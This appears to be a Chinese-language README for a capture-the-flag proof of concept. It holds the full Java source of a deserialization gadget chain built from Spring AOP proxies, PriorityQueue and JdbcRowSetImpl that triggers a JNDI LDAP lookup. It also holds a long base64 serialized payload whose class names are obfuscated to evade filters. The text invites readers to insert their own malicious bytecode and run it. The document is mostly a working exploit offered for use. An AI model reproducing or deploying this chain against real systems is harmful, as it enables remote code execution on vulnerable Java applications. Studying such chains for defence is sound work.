# ccsssc_Poc
可以去下载release中的源码自己修改恶意字节码

下面是生成触发jndimap的源码
```
/**
 * @className Exp
 * @Author shushu
 * @Data 2025/3/24
 **/
package com.example.ezjav;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.support.DefaultIntroductionAdvisor;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import com.sun.rowset.JdbcRowSetImpl;
import org.aopalliance.aop.Advice;
import org.aopalliance.intercept.MethodInterceptor;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import java.lang.reflect.*;
import java.util.*;
import com.example.ezjav.utils.CustomObjectOutputStream;

import javax.management.BadAttributeValueExpException;

public class Exp {
    public static byte[] getBytes() throws IOException {
        //    第一次
//        InputStream inputStream = new FileInputStream(new File("./TomcatEcho.class"));
        //  第二次
        InputStream inputStream = new FileInputStream(new File("C:\\removeDisk\\ideProject\\JavaProject\\learn\\CCchainLearn\\target\\classes\\ExpClass\\TestTemplatesImpl.class"));

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }
    public static void main(String[] args) throws Exception{

        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/Deserialize/Jackson/My/Command/1");
        Method method=jdbcRowSet.getClass().getMethod("getDatabaseMetaData");
        System.out.println(method);
        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet);
        AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);
        Proxy proxy1 = (Proxy) getAProxy(advice,Advice.class);
        Proxy finalproxy=(Proxy) getBProxy(proxy1,new Class[]{Comparator.class});

        PriorityQueue priorityqueue=new PriorityQueue(1);
        priorityqueue.add(1);
        priorityqueue.add(2);

        setValue(priorityqueue,"comparator",finalproxy);
        setValue(priorityqueue,"queue",new Object[]{proxy1,proxy1});


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        CustomObjectOutputStream o = new CustomObjectOutputStream(byteArrayOutputStream);
        o.writeObject(priorityqueue);
        String payload = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        System.out.println(payload);

//        new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(payload))).readObject();
    }
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static Object getBProxy(Object obj,Class[] clazzs) throws Exception
    {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);
        return proxy;
    }
    public static Object getAProxy(Object obj,Class<?> clazz) throws Exception
    {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        AbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;

        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));
        advisedSupport.addAdvisor(advisor);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);
        return proxy;
    }
}

```

下面是触发jndimap的base64数据
```
rO0ABXNyAEXggarggaHggbbggaHggK7ggbXggbTgganggazggK7ggZDggbLggangga/ggbLgganggbTggbnggZHggbXggaXggbXggaWU2jC0+z+CsQMAAkkABHNpemVMAApjb21wYXJhdG9ydAAWTGphdmEvdXRpbC9Db21wYXJhdG9yO3hwAAAAAnN9AAAAAQAUamF2YS51dGlsLkNvbXBhcmF0b3J4cgBF4IGq4IGh4IG24IGh4ICu4IGs4IGh4IGu4IGn4ICu4IGy4IGl4IGm4IGs4IGl4IGj4IG04ICu4IGQ4IGy4IGv4IG44IG54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3IAnOCBr+CBsuCBp+CAruCBs+CBsOCBsuCBqeCBruCBp+CBpuCBsuCBoeCBreCBpeCBt+CBr+CBsuCBq+CAruCBoeCBr+CBsOCAruCBpuCBsuCBoeCBreCBpeCBt+CBr+CBsuCBq+CAruCBiuCBpOCBq+CBhOCBueCBruCBoeCBreCBqeCBo+CBgeCBr+CBsOCBkOCBsuCBr+CBuOCBuUzEtHEO65b8AgAEWgANZXF1YWxzRGVmaW5lZFoAD2hhc2hDb2RlRGVmaW5lZEwAB2FkdmlzZWR0ADJMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvZnJhbWV3b3JrL0FkdmlzZWRTdXBwb3J0O1sAEXByb3hpZWRJbnRlcmZhY2VzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHAAAHNyAJDgga/ggbLggafggK7ggbPggbDggbLggangga7ggafggabggbLggaHgga3ggaXggbfgga/ggbLggavggK7ggaHgga/ggbDggK7ggabggbLggaHgga3ggaXggbfgga/ggbLggavggK7ggYHggaTggbbgganggbPggaXggaTggZPggbXggbDggbDgga/ggbLggbQky4o8+qTFdQIABVoAC3ByZUZpbHRlcmVkTAATYWR2aXNvckNoYWluRmFjdG9yeXQAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNvckNoYWluRmFjdG9yeTtMAAhhZHZpc29yc3QAEExqYXZhL3V0aWwvTGlzdDtMAAppbnRlcmZhY2VzcQB+AA1MAAx0YXJnZXRTb3VyY2V0ACZMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvVGFyZ2V0U291cmNlO3hyAIfgga/ggbLggafggK7ggbPggbDggbLggangga7ggafggabggbLggaHgga3ggaXggbfgga/ggbLggavggK7ggaHgga/ggbDggK7ggabggbLggaHgga3ggaXggbfgga/ggbLggavggK7ggZDggbLgga/ggbjggbnggYPgga/gga7ggabgganggaeLS/Pmp+D3bwIABVoAC2V4cG9zZVByb3h5WgAGZnJvemVuWgAGb3BhcXVlWgAIb3B0aW1pemVaABBwcm94eVRhcmdldENsYXNzeHAAAAAAAABzcgC04IGv4IGy4IGn4ICu4IGz4IGw4IGy4IGp4IGu4IGn4IGm4IGy4IGh4IGt4IGl4IG34IGv4IGy4IGr4ICu4IGh4IGv4IGw4ICu4IGm4IGy4IGh4IGt4IGl4IG34IGv4IGy4IGr4ICu4IGE4IGl4IGm4IGh4IG14IGs4IG04IGB4IGk4IG24IGp4IGz4IGv4IGy4IGD4IGo4IGh4IGp4IGu4IGG4IGh4IGj4IG04IGv4IGy4IG5VN1kN+JOcfcCAAB4cHNyADnggarggaHggbbggaHggK7ggbXggbTgganggazggK7ggYHggbLggbLggaHggbnggYzgganggbPggbR4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4c3EAfgATAAAAAXcEAAAAAXZyAE7gga/ggbLggafggK7ggaHgga/ggbDggaHggazggazgganggaHgga7ggaPggaXggK7ggaHgga/ggbDggK7ggYHggaTggbbgganggaPggaUAAAAAAAAAAAAAAHhweHNyAJzgga/ggbLggafggK7ggbPggbDggbLggangga7ggafggabggbLggaHgga3ggaXggbfgga/ggbLggavggK7ggaHgga/ggbDggK7ggbTggaHggbLggafggaXggbTggK7ggZPggangga7ggafggazggaXggbTgga/gga7ggZTggaHggbLggafggaXggbTggZPgga/ggbXggbLggaPggaV9VW71x/j6ugIAAUwABnRhcmdldHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwc30AAAABABpvcmcuYW9wYWxsaWFuY2UuYW9wLkFkdmljZXhxAH4ABHNxAH4ABwAAc3EAfgALAAAAAAAAc3EAfgARc3EAfgATAAAAAXcEAAAAAXNyAK7gga/ggbLggafggK7ggbPggbDggbLggangga7ggafggabggbLggaHgga3ggaXggbfgga/ggbLggavggK7ggaHgga/ggbDggK7ggbPggbXggbDggbDgga/ggbLggbTggK7ggYTggaXggabggaHggbXggazggbTggYngga7ggbTggbLgga/ggaTggbXggaPggbTggangga/gga7ggYHggaTggbbgganggbPgga/ggbLIxW5AjgQcQgIAA0kABW9yZGVyTAAGYWR2aWNldAAcTG9yZy9hb3BhbGxpYW5jZS9hb3AvQWR2aWNlO0wACmludGVyZmFjZXN0AA9MamF2YS91dGlsL1NldDt4cH////9zfQAAAAIAK29yZy5hb3BhbGxpYW5jZS5pbnRlcmNlcHQuTWV0aG9kSW50ZXJjZXB0b3IAGm9yZy5hb3BhbGxpYW5jZS5hb3AuQWR2aWNleHEAfgAEc3EAfgAHAABzcQB+AAsAAAAAAABzcQB+ABFzcQB+ABMAAAAAdwQAAAAAeHNxAH4AEwAAAAB3BAAAAAB4c3EAfgAYc3IAmeCBr+CBsuCBp+CAruCBs+CBsOCBsuCBqeCBruCBp+CBpuCBsuCBoeCBreCBpeCBt+CBr+CBsuCBq+CAruCBoeCBr+CBsOCAruCBoeCBs+CBsOCBpeCBo+CBtOCBquCAruCBgeCBs+CBsOCBpeCBo+CBtOCBiuCBgeCBsuCBr+CBteCBruCBpOCBgeCBpOCBtuCBqeCBo+CBpS8ua9q0CIWfAgAAeHIAn+CBr+CBsuCBp+CAruCBs+CBsOCBsuCBqeCBruCBp+CBpuCBsuCBoeCBreCBpeCBt+CBr+CBsuCBq+CAruCBoeCBr+CBsOCAruCBoeCBs+CBsOCBpeCBo+CBtOCBquCAruCBgeCBouCBs+CBtOCBsuCBoeCBo+CBtOCBgeCBs+CBsOCBpeCBo+CBtOCBiuCBgeCBpOCBtuCBqeCBo+CBpS6UmCf1wbudAgARWgAVYXJndW1lbnRzSW50cm9zcGVjdGVkSQAQZGVjbGFyYXRpb25PcmRlckkAFmpvaW5Qb2ludEFyZ3VtZW50SW5kZXhJACBqb2luUG9pbnRTdGF0aWNQYXJ0QXJndW1lbnRJbmRleEwAEGFyZ3VtZW50QmluZGluZ3N0AA9MamF2YS91dGlsL01hcDtbAA1hcmd1bWVudE5hbWVzdAATW0xqYXZhL2xhbmcvU3RyaW5nO0wAFWFzcGVjdEluc3RhbmNlRmFjdG9yeXQAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9hc3BlY3RqL0FzcGVjdEluc3RhbmNlRmFjdG9yeTtMAAphc3BlY3ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAOZGVjbGFyaW5nQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wAHmRpc2NvdmVyZWRSZXR1cm5pbmdHZW5lcmljVHlwZXQAGExqYXZhL2xhbmcvcmVmbGVjdC9UeXBlO0wAF2Rpc2NvdmVyZWRSZXR1cm5pbmdUeXBlcQB+ADNMABZkaXNjb3ZlcmVkVGhyb3dpbmdUeXBlcQB+ADNMAAptZXRob2ROYW1lcQB+ADJbAA5wYXJhbWV0ZXJUeXBlc3EAfgAJTAAIcG9pbnRjdXR0ADtMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvYXNwZWN0ai9Bc3BlY3RKRXhwcmVzc2lvblBvaW50Y3V0O0wADXJldHVybmluZ05hbWVxAH4AMkwADHRocm93aW5nTmFtZXEAfgAyeHAAAAAAAP//////////cHBzcgC64IGv4IGy4IGn4ICu4IGz4IGw4IGy4IGp4IGu4IGn4IGm4IGy4IGh4IGt4IGl4IG34IGv4IGy4IGr4ICu4IGh4IGv4IGw4ICu4IGh4IGz4IGw4IGl4IGj4IG04IGq4ICu4IGT4IGp4IGu4IGn4IGs4IGl4IG04IGv4IGu4IGB4IGz4IGw4IGl4IGj4IG04IGJ4IGu4IGz4IG04IGh4IGu4IGj4IGl4IGG4IGh4IGj4IG04IGv4IGy4IG5p7UxgK8nNLQCAAFMAA5hc3BlY3RJbnN0YW5jZXEAfgAZeHBzcgBX4IGj4IGv4IGt4ICu4IGz4IG14IGu4ICu4IGy4IGv4IG34IGz4IGl4IG04ICu4IGK4IGk4IGi4IGj4IGS4IGv4IG34IGT4IGl4IG04IGJ4IGt4IGw4IGszibYH0lzwgUCAAdMAARjb25udAAVTGphdmEvc3FsL0Nvbm5lY3Rpb247TAANaU1hdGNoQ29sdW1uc3QAEkxqYXZhL3V0aWwvVmVjdG9yO0wAAnBzdAAcTGphdmEvc3FsL1ByZXBhcmVkU3RhdGVtZW50O0wABXJlc01EdAAcTGphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhO0wABnJvd3NNRHQAJUxqYXZheC9zcWwvcm93c2V0L1Jvd1NldE1ldGFEYXRhSW1wbDtMAAJyc3QAFExqYXZhL3NxbC9SZXN1bHRTZXQ7TAAPc3RyTWF0Y2hDb2x1bW5zcQB+ADt4cgBR4IGq4IGh4IG24IGh4IG44ICu4IGz4IGx4IGs4ICu4IGy4IGv4IG34IGz4IGl4IG04ICu4IGC4IGh4IGz4IGl4IGS4IGv4IG34IGT4IGl4IG0Q9EdpU3CseACABVJAAtjb25jdXJyZW5jeVoAEGVzY2FwZVByb2Nlc3NpbmdJAAhmZXRjaERpckkACWZldGNoU2l6ZUkACWlzb2xhdGlvbkkADG1heEZpZWxkU2l6ZUkAB21heFJvd3NJAAxxdWVyeVRpbWVvdXRaAAhyZWFkT25seUkACnJvd1NldFR5cGVaAAtzaG93RGVsZXRlZEwAA1VSTHEAfgAyTAALYXNjaWlTdHJlYW10ABVMamF2YS9pby9JbnB1dFN0cmVhbTtMAAxiaW5hcnlTdHJlYW1xAH4AQUwACmNoYXJTdHJlYW10ABBMamF2YS9pby9SZWFkZXI7TAAHY29tbWFuZHEAfgAyTAAKZGF0YVNvdXJjZXEAfgAyTAAJbGlzdGVuZXJzcQB+ADtMAANtYXBxAH4AL0wABnBhcmFtc3QAFUxqYXZhL3V0aWwvSGFzaHRhYmxlO0wADXVuaWNvZGVTdHJlYW1xAH4AQXhwAAAD8AEAAAPoAAAAAAAAAAIAAAAAAAAAAAAAAAABAAAD7ABwcHBwcHQANmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9EZXNlcmlhbGl6ZS9KYWNrc29uL015L0NvbW1hbmQvMXNyADDggarggaHggbbggaHggK7ggbXggbTgganggazggK7ggZbggaXggaPggbTgga/ggbLZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyADnggZvggYzggarggaHggbbggaHggK7ggazggaHgga7ggafggK7ggY/ggaLggarggaXggaPggbTggLuQzlifEHMpbAIAAHhwAAAACnBwcHBwcHBwcHB4cHNyADnggarggaHggbbggaHggK7ggbXggbTgganggazggK7ggYjggaHggbPggajggbTggaHggaLggazggaUTuw8lIUrkuAMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAIdwgAAAALAAAAAHhwcHNxAH4ARgAAAAAAAAAKdXEAfgBJAAAACnNyADPggarggaHggbbggaHggK7ggazggaHgga7ggafggK7ggYngga7ggbTggaXggafggaXggbIS4qCk94GHOAIAAUkABXZhbHVleHIAMOCBquCBoeCBtuCBoeCAruCBrOCBoeCBruCBp+CAruCBjuCBteCBreCBouCBpeCBsoaslR0LlOCLAgAAeHD/////cQB+AFFxAH4AUXEAfgBRcQB+AFFxAH4AUXEAfgBRcQB+AFFxAH4AUXEAfgBReHBwcHBzcQB+AEYAAAAAAAAACnVxAH4ASQAAAApwcHBwcHBwcHBweHQAAHZxAH4AOXB2cgAw4IGq4IGh4IG24IGh4ICu4IGs4IGh4IGu4IGn4ICu4IGP4IGi4IGq4IGl4IGj4IG0AAAAAAAAAAAAAAB4cHEAfgBXdAATZ2V0RGF0YWJhc2VNZXRhRGF0YXVyADbggZvggYzggarggaHggbbggaHggK7ggazggaHgga7ggafggK7ggYPggazggaHggbPggbPggLurFteuy81amQIAAHhwAAAAAHNyAKvgga/ggbLggafggK7ggbPggbDggbLggangga7ggafggabggbLggaHgga3ggaXggbfgga/ggbLggavggK7ggaHgga/ggbDggK7ggaHggbPggbDggaXggaPggbTggarggK7ggYHggbPggbDggaXggaPggbTggYrggYXggbjggbDggbLggaXggbPggbPggangga/gga7ggZDgga/ggangga7ggbTggaPggbXggbTgCRooAzmPHgIABEwAC2JlYW5GYWN0b3J5dAAvTG9yZy9zcHJpbmdmcmFtZXdvcmsvYmVhbnMvZmFjdG9yeS9CZWFuRmFjdG9yeTtMABhwb2ludGN1dERlY2xhcmF0aW9uU2NvcGVxAH4AM1sAFnBvaW50Y3V0UGFyYW1ldGVyTmFtZXNxAH4AMFsAFnBvaW50Y3V0UGFyYW1ldGVyVHlwZXNxAH4ACXhyAK7gga/ggbLggafggK7ggbPggbDggbLggangga7ggafggabggbLggaHgga3ggaXggbfgga/ggbLggavggK7ggaHgga/ggbDggK7ggbPggbXggbDggbDgga/ggbLggbTggK7ggYHggaLggbPggbTggbLggaHggaPggbTggYXggbjggbDggbLggaXggbPggbPggangga/gga7ggZDgga/ggangga7ggbTggaPggbXggbSMooLQ1cEqUAIAAkwACmV4cHJlc3Npb25xAH4AMkwACGxvY2F0aW9ucQB+ADJ4cHBwcHB1cgA54IGb4IGM4IGq4IGh4IG24IGh4ICu4IGs4IGh4IGu4IGn4ICu4IGT4IG04IGy4IGp4IGu4IGn4IC7rdJW5+kde0cCAAB4cAAAAAB1cQB+AFkAAAAAcHB1cQB+AFkAAAADdnIAaeCBr+CBsuCBp+CAruCBs+CBsOCBsuCBqeCBruCBp+CBpuCBsuCBoeCBreCBpeCBt+CBr+CBsuCBq+CAruCBoeCBr+CBsOCAruCBk+CBsOCBsuCBqeCBruCBp+CBkOCBsuCBr+CBuOCBuQAAAAAAAAAAAAAAeHB2cgB74IGv4IGy4IGn4ICu4IGz4IGw4IGy4IGp4IGu4IGn4IGm4IGy4IGh4IGt4IGl4IG34IGv4IGy4IGr4ICu4IGh4IGv4IGw4ICu4IGm4IGy4IGh4IGt4IGl4IG34IGv4IGy4IGr4ICu4IGB4IGk4IG24IGp4IGz4IGl4IGkAAAAAAAAAAAAAAB4cHZyAHjgga/ggbLggafggK7ggbPggbDggbLggangga7ggafggabggbLggaHgga3ggaXggbfgga/ggbLggavggK7ggaPgga/ggbLggaXggK7ggYTggaXggaPgga/ggbLggaHggbTggangga7ggafggZDggbLgga/ggbjggbkAAAAAAAAAAAAAAHhwc3IAReCBquCBoeCBtuCBoeCAruCBteCBtOCBqeCBrOCAruCBjOCBqeCBruCBq+CBpeCBpOCBiOCBoeCBs+CBqOCBk+CBpeCBtNhs11qV3SoeAgAAeHIAM+CBquCBoeCBtuCBoeCAruCBteCBtOCBqeCBrOCAruCBiOCBoeCBs+CBqOCBk+CBpeCBtLpEhZWWuLc0AwAAeHB3DAAAABA/QAAAAAAAAHh4c3EAfgATAAAAAHcEAAAAAHhzcQB+ABhxAH4ANnVxAH4AWQAAAANxAH4AZHEAfgBmcQB+AGh1cQB+AFkAAAAEcQB+ABdxAH4AZHEAfgBmcQB+AGh3BAAAAANxAH4AHHEAfgAceA==
```


然后把release中的源码下载好依赖就行，直接启动